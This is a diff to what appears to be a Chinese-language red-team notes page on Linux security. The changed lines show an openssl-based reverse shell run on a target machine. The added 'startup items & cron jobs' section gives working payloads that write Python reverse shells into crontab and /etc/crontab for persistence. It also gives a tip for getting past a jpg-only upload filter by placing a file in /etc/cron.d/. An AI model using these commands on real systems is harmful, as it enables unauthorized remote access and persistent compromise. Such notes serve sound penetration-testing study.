@@ -288,7 +288,9 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 
 # 启动监听
 openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+```
 
+```bash
 # 在目标机器上回弹
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
 ```
@@ -328,6 +330,37 @@ systemctl status network.service    # 可以看到 id 已经执行
 ```
 
 ![](../../../../assets/img/Security/RedTeam/OS安全/Linux安全/4.png)
+
+---
+
+## 启动项 & 定时任务
+
+**相关文章**
+- [Linux Crontab定时任务反弹shell的坑](https://joychou.org/hostsec/linux-crontab-rebound-shell-hole.html)
+
+**一些路径**
+```
+/etc/crontab
+/etc/cron.d/
+/var/spool/cron/crontabs/
+/var/spool/cron/root
+```
+
+**payload**
+```
+(crontab -l;printf "* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n")|crontab -
+
+echo "* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/crontab
+
+echo "* * * * * root echo 'success' > /tmp/crontest" >> /etc/cron.d/test123.cron
+```
+
+**Tips**
+- 定时任务的报错可以通过查看 `ca` 来排错
+- ubuntu 不能使用 bash 反弹 shell
+- ubuntu 用户的定时任务在 /var/spool/cron/crontabs/ 目录下
+- ubuntu 用户定时任务必须在 600 权限才能执行
+- 如果做了白名单后缀,只允许 jpg ,可以传到 `/etc/cron.d/` 目录下,这里文件可以任意后缀命名,上传文件名为 `test.jpg` 绕过对应的安全检查
 
 ---
 
